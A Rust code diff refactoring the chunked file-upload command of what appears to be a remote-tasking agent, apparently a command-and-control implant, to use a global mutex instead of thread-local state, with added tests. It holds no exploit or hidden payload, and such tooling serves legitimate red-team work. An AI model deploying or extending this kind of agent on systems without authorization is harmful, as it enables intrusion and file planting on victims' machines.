@@ -20,8 +20,10 @@
 //! }
 //! ```
 
+use std::collections::HashMap;
 use std::io::{Read, Write};
 use std::path::{Path, PathBuf};
+use std::sync::{Mutex, OnceLock};
 
 use base64::Engine;
 use base64::engine::general_purpose::STANDARD;
@@ -82,9 +84,16 @@ struct PendingUpload {
     host: Option<String>,
 }
 
-thread_local! {
-    static PENDING_UPLOADS: std::cell::RefCell<std::collections::HashMap<Uuid, PendingUpload>> =
-        std::cell::RefCell::new(std::collections::HashMap::new());
+static PENDING_UPLOADS: OnceLock<Mutex<HashMap<Uuid, PendingUpload>>> = OnceLock::new();
+
+fn pending_uploads() -> &'static Mutex<HashMap<Uuid, PendingUpload>> {
+    PENDING_UPLOADS.get_or_init(|| Mutex::new(HashMap::new()))
+}
+
+fn pending_uploads_lock() -> std::sync::MutexGuard<'static, HashMap<Uuid, PendingUpload>> {
+    pending_uploads()
+        .lock()
+        .unwrap_or_else(|poisoned| poisoned.into_inner())
 }
 
 fn clean_filename(name: &str) -> Option<String> {
@@ -168,11 +177,10 @@ fn cleanup_failed_upload(state: &PendingUpload, message: &str) -> TaskResponse {
 pub fn responses_from_receipts(receipts: &[PostResponseReceipt]) -> Vec<TaskResponse> {
     let mut out = Vec::new();
     for receipt in receipts {
-        let mut state =
-            match PENDING_UPLOADS.with(|cell| cell.borrow_mut().remove(&receipt.task_id)) {
-                Some(state) => state,
-                None => continue,
-            };
+        let mut state = match pending_uploads_lock().remove(&receipt.task_id) {
+            Some(state) => state,
+            None => continue,
+        };
 
         if let Some(error) = &receipt.error {
             out.push(cleanup_failed_upload(
@@ -241,9 +249,7 @@ pub fn responses_from_receipts(receipts: &[PostResponseReceipt]) -> Vec<TaskResp
         } else {
             let next_chunk = chunk_num + 1;
             out.push(upload_request(&state, next_chunk));
-            PENDING_UPLOADS.with(|cell| {
-                cell.borrow_mut().insert(state.task_id, state);
-            });
+            pending_uploads_lock().insert(state.task_id, state);
         }
     }
     out
@@ -304,9 +310,7 @@ pub fn handle(task: &TaskMessage) -> TaskResponse {
             host: params.host.filter(|h| !h.trim().is_empty()),
         };
         let response = upload_request(&state, 1);
-        PENDING_UPLOADS.with(|cell| {
-            cell.borrow_mut().insert(task.id, state);
-        });
+        pending_uploads_lock().insert(task.id, state);
         return response;
     }
 
@@ -403,6 +407,7 @@ mod tests {
         };
 
         let task = TaskMessage {
+            id: Uuid::new_v4(),
             command: "upload".into(),
             parameters: serde_json::json!({
                 "path": tmp_path.to_string_lossy(),
@@ -427,6 +432,7 @@ mod tests {
     #[test]
     fn test_upload_invalid_base64() {
         let task = TaskMessage {
+            id: Uuid::new_v4(),
             command: "upload".into(),
             parameters: r#"{"path": "/tmp/test", "file_bytes": "!!!not-valid-base64!!!"}"#.into(),
             ..Default::default()
@@ -446,6 +452,7 @@ mod tests {
         };
 
         let task = TaskMessage {
+            id: Uuid::new_v4(),
             command: "upload".into(),
             parameters: serde_json::json!({
                 "path": tmp_path.to_string_lossy(),
@@ -477,6 +484,51 @@ mod tests {
         assert_eq!(responses.len(), 1);
         assert_eq!(responses[0].completed, Some(true));
         assert!(responses[0].upload.is_none());
+        assert_eq!(std::fs::read(&tmp_path).unwrap(), original);
+
+        let _ = std::fs::remove_file(tmp_path);
+    }
+
+    #[test]
+    fn test_upload_pending_state_crosses_worker_threads() {
+        let original = b"threaded upload";
+        let file_id = Uuid::new_v4();
+        let tmp_path = {
+            let mut p = std::env::temp_dir();
+            p.push(format!(
+                "nanaz_up_threaded_test_{}_{}.bin",
+                std::process::id(),
+                file_id
+            ));
+            p
+        };
+
+        let task = TaskMessage {
+            id: Uuid::new_v4(),
+            command: "upload".into(),
+            parameters: serde_json::json!({
+                "path": tmp_path.to_string_lossy(),
+                "file_id": file_id,
+            })
+            .to_string(),
+            ..Default::default()
+        };
+        let task_id = task.id;
+
+        let request = std::thread::spawn(move || handle(&task)).join().unwrap();
+        assert_eq!(request.status.as_deref(), Some("processing"));
+
+        let responses = responses_from_receipts(&[PostResponseReceipt {
+            task_id,
+            status: "success".into(),
+            file_id: Some(file_id),
+            chunk_num: Some(1),
+            total_chunks: Some(1),
+            chunk_data: Some(crate::common::base64::encode(original)),
+            ..Default::default()
+        }]);
+        assert_eq!(responses.len(), 1);
+        assert_eq!(responses[0].completed, Some(true));
         assert_eq!(std::fs::read(&tmp_path).unwrap(), original);
 
         let _ = std::fs::remove_file(tmp_path);
